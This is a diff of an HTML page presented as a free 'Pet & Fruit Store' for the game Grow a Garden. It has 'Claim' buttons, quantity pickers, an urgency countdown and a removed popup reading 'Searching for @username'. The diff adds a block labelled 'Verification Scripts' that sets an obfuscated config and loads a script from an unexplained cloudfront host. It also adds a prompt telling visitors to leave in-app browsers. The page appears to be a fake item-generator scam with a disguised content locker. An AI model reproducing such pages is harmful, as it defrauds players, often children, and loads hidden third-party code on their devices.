-      const popupContent = document.querySelector('.popup-content');
-      
-      popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Get Item</h3>
+    /* Better accessibility - text shadows for contrast */
+    .item-title-stroke {
+        text-shadow: -1px -1px 0 #333, 1px -1px 0 #333, -1px 1px 0 #333, 1px 1px 0 #333;
+    }
+    .price-text-old {
+        text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+    }
+
+    /* Slight transparent white overlay to make text readable on bg */
+    body::before {
+        content: "";
+        position: fixed;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: rgba(255,255,255,0.15);
+        z-index: -1;
+    }
+
+    #countdown-timer {
+        color: #ef4444; /* red-500 */
+        text-shadow: -1.5px -1.5px 0 #000, 1.5px -1.5px 0 #000, -1.5px 1.5px 0 #000, 1.5px 1.5px 0 #000;
+    }
+
+    /* Floating items background animation */
+    #floating-items-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+        z-index: -2;
+    }
+
+    .floating-item {
+        position: absolute;
+        opacity: 0.25;
+        will-change: transform;
+        animation-iteration-count: infinite;
+        animation-timing-function: linear;
+    }
+
+    @keyframes float1 {
+        0% { transform: translate(-100px, 110vh) rotate(0deg); }
+        100% { transform: translate(110vw, -100px) rotate(720deg); }
+    }
+
+    @keyframes float2 {
+        0% { transform: translate(110vw, 110vh) rotate(0deg); }
+        100% { transform: translate(-100px, -100px) rotate(-720deg); }
+    }
+
+    @keyframes float3 {
+        0% { transform: translate(50vw, 110vh) rotate(0deg); }
+        100% { transform: translate(50vw, -100px) rotate(360deg); }
+    }
+    
+    /* In-App Browser Fallback Styles */
+    #browser-fallback {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background-color: rgba(0,0,0,0.8);
+        z-index: 9999;
+        color: white;
+        text-align: center;
+        padding: 2rem;
+    }
+    </style>
+    <!-- Verification Scripts -->
+    <script type="text/javascript">
+    var fbOCN_vLC_XsidAc={"it":4523271,"key":"b8b5f"};
+</script>
+<script src="https://dfmpe7igjx4jo.cloudfront.net/0e39044.js"></script>
+</head>
+
+<body class="text-white">
+    <div id="browser-fallback">
+        <div class="flex flex-col items-center justify-center h-full">
+            <h2 class="text-3xl font-bold mb-4">Please open this page in your browser!</h2>
+            <p class="mb-6">This page works best in your phone's default browser (like Safari or Chrome).</p>
+            <a id="open-in-browser-link" href="#" target="_blank" class="bg-blue-500 text-white font-bold py-3 px-6 rounded-lg hover:bg-blue-600 transition-colors">Open in Browser</a>
         </div>
-        <div style="text-align:center;padding:20px">
-          <div class="folding">
-            <div class="sk-cube1 sk-cube"></div>
-            <div class="sk-cube2 sk-cube"></div>
-            <div class="sk-cube4 sk-cube"></div>
-            <div class="sk-cube3 sk-cube"></div>
-            <div class="square"></div>
-          </div>
-          <p class="searching-text">Searching for @${username}</p>
+    </div>
+
+    <div id="floating-items-container"></div>
+    <div class="container mx-auto px-4 py-8">
+        <!-- Header Section -->
+        <header class="text-center mb-12">
+            <img alt="Grow A Garden Logo" class="mx-auto mb-4 w-64" src="https://i.namu.wiki/i/xpSObOe0NvUz9onMeEk6VjlXvIqdLFMqoNTRtIO0nyy3ugvOXYPQnWe02RtQSvn2PxrxONH5VHhP5JyEA2C07A.webp"/>
+            <h1 class="text-4xl md:text-5xl font-fredoka text-yellow-300 drop-shadow-lg">Pet &amp; Fruit Store</h1>
+            <div id="countdown-timer" class="text-2xl md:text-3xl font-fredoka mt-4">02:00</div>
+        </header>
+        <!-- Pet Section -->
+        <section class="mb-16" id="pets">
+            <h2 class="text-3xl font-fredoka text-center mb-8">Awesome Pets</h2>
+            <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 md:gap-8">
+			<!-- Pet Card: jappa Pet -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Racoon Pet" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/8/84/Kappa_.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Kappa</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+               <!-- Pet Card: Kitsune Pet -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Racoon Pet" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/4/4d/Kitsune_.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Kitsune</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+               <!-- Pet Card: Racoon Pet -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Racoon Pet" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/5/54/Raccon_Better_Quality.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Raccoon</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Primal Egg -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Fennec Fox" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/8/8f/PrimalEgg.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Primal Egg</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Golden Bee -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Fennec Fox" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/e/e8/GoldenBee.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Golden Bee</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Disco Bee" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/f/f8/T-Rex.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">T- Rex</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Disco Bee" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/3/3c/BoneBlossomCrop.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Bone Blossom</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Disco Bee -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Disco Bee" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/f/f2/DiscoBeeIcon.gif"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Disco Bee</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Fennec Fox -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Fennec Fox" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/e/e8/FennecFoxIcon.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Fennec Fox</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+               
+                <!-- Pet Card: Mimic Octopus -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Mimic Octopus" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/0/00/MimicOctopusIcon.webp"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Mimic Octopus</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Butterfly Pet -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Butterfly Pet" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/1/18/Thy_Butterfly_V2.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Butterfly Pet</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Scarlet Macaw -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Scarlet Macaw" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/2/21/ScarletMacawIcon.webp"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Scarlet Macaw</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Dragonfly Pet -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Dragonfly Pet" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/c/c9/DragonflyIcon.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Dragonfly Pet</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Queen Bee -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Queen Bee" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/7/7a/Queen_bee.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Queen Bee</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pet Card: Red Fox -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Red Fox" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/d/d5/RedFox.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Red Fox</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <!-- Fruit Section -->
+        <section id="fruits">
+            <h2 class="text-3xl font-fredoka text-center mb-8">Fresh Fruits</h2>
+            <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 md:gap-8">
+              
+               <!-- Fruit Card: Candy Blossom -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/d/da/MapleAppleProduce.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Maple Apple</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+<!-- Fruit Card: Candy Blossom -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/1/11/SpikedMangoProduce.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Spiked Mango</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+              <!-- Fruit Card: Candy Blossom -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/5/52/CandyBlossomPic.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Candy Blossom</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+              <!-- Fruit Card: Dragon Sapling -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/8/89/DragonSaplingCrop.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Dragon Sapling</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Horsetail -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/4/49/HorsetailCrop.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Horsetail</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Lingonberry -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/d/db/LingonberryCrop.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Lingonberry</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Amber Spine -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/f/f8/AmberSpineCrop.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Amber Spine</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Fruit Card: Grand Volcania -->
+                <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+                    <div>
+                        <img alt="Candy Blossom" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover" src="https://static.wikia.nocookie.net/growagarden/images/5/5a/GrandVolcan.png"/>
+                    </div>
+                    <div>
+                        <p class="text-xl md:text-2xl font-bold mb-2 font-fredoka item-title-stroke">Grand Volcania</p>
+                        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+                        <div class="mt-3 flex items-center justify-center bg-green-600 rounded-full p-1">
+                            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+                            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+                            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+                        </div>
+                    </div>
+                </div>
